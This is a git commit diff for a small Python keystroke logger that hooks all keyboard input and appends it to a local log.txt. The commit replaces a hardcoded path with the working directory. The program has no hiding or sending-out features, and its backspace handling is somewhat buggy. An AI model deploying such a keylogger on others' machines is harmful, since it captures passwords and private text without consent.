ca86c1a11a0b0708da1089b91cd7268511355155
armageddon0204 <egan20080204@gmail.com>
2026-05-04 10:14:27 +0800

    Use cwd to save

--- execution.bat
+++ execution.bat
@@ -1,3 +1,4 @@
 @echo off
+::Your python absolute directory
 cd /d "C:\Users\egan2\Desktop\Keyboard_listening\"
 python3 "main.py"
--- main.py
+++ main.py
@@ -1,7 +1,9 @@
 import keyboard, os
+cwd = os.getcwd()
+save_path = f'{cwd}\\log.txt'
 key = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
 def onPress(e):
-        with open('C:\\Users\\egan2\\Desktop\\Keyboard_listening\\log.txt', 'a') as f:
+        with open(save_path, 'a') as f:
                 if e.event_type=='down':
                         if e.name== 'enter':
                                 f.write('\n')
@@ -10,12 +12,12 @@ def onPress(e):
                         if e.name=='space':
                                 f.write(" ")
                         if e.name == 'backspace':
-                                with open('C:\\Users\\egan2\\Desktop\\Keyboard_listening\\log.txt', 'r') as f:
+                                with open(save_path, 'r') as f:
                                         content = f.read()
                                         print(content)
                                 if content: 
                                         new_content = content[:-1]
-                                with open('C:\\Users\\egan2\\Desktop\\Keyboard_listening\\log.txt', 'w') as f:
+                                with open(save_path, 'w') as f:
                                         f.write(new_content)
                                 
 keyboard.hook(onPress)
